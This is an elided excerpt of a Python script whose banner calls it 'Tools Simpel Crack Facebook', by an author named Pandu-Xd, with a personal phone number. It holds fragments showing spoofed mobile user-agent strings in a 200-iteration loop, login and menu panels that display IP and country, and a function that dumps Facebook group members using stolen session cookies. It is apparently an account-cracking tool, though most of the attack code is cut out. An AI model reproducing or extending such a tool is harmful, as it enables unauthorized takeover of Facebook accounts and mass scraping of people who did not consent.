...
for z in range(200):
	...
	ua = f"Mozilla/5.0 (Linux; Android  11; SAMSUNG SM-L372N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/78.0.4549.132 Mobile Safari/537.36"
	#ua = f"Mozilla/5.0 (Linux; Android  11; SAMSUNG SM-L372N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/78.0.4549.132 Mobile Safari/537.36"
	#ua = f"Mozilla/5.0 (Linux; Android  11; SAMSUNG SM-L372N) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/78.0.4549.132 Mobile Safari/537.36"
...
██▄▄████▄▄█
█   ▼▼▼▼▼▼                      • || Tools Simpel    
█  Tools Simpel Crack Facebook  • || Author : Pandu-Xd
█  Status Version 1.0           • || Versions : 1.0
█  Made By Pandu-Xd             • || WhatsApp : +62 818-0475-0629
█    ▲▲▲▲▲▲
███████████    
...
class Login:
	...
	def menu_login(self):
		Logo().logonya()
		prints(Panel(f"{P2}Ip address : {self.ip}",padding=(0,30),subtitle=f"{H2}Asal Negara : {self.negara}",style=f"{color_panel}"))
...
class Menu:
	...
	def menu(self):
		...
		###----------[ PANEL BIASA ]---------- ###
		prints(Panel(f"{P2}Ip Address : {self.ip}",padding=(0,30),title=f"{H2}Nama Facebook: {nama}",subtitle=f"{H2}Asal negara : {self.negara}",style=f"{color_panel}"))
...
class Dump:
	...
	def Dump_MemberGrup(self,url):
		try:
			data = parser(ses.get(url,cookies=self.cookie,headers={"user-agent": "Mozilla/5.0 (Linux; Android  7; SAMSUNG SM-T87V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/93.0.4454.97 Mobile Safari/537.36"}).text, "html.parser")
